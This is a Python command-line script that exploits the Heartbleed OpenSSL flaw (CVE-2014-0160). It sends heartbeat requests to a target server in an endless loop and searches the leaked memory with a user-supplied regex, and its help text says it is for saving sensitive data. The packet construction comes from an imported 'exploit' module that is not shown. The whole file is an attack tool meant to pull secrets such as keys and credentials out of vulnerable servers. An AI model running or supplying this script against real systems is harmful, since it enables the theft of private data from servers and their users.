import os
import random
import re
import socket
import sys
import time
from optparse import OptionParser
import requests
import exploit

options = OptionParser(usage='%prog server [options]',
                       description='exploit SSL heartbeat vulnerability (CVE-2014-0160) and save sensible data')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to direct traffic to (default: 443)')
options.add_option('-d', '--delay', type='int', default=0, help='delay between requests in seconds')
options.add_option('-r', '--regex', type='str', default="*",
                   help='REGEX to search for in the memory of the vulnerable server. e.g. "\x70\x79\x74" = "pyt"')


def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    s = exploit.init_exploit(opts, args)
    while 1:
        print('Sending heartbeat request...')
        sys.stdout.flush()

        s.send(exploit.heartbleedPacket)

        # We asked for 64 kB, so we should get 4 packets
        contentType, version, payload = exploit.receiveTLSMessage(s, 4)
        pattern = re.compile(opts.regex.encode())
        matches = pattern.findall(payload)
        print(matches)
        time.sleep(opts.delay)


if __name__ == '__main__':
    main()
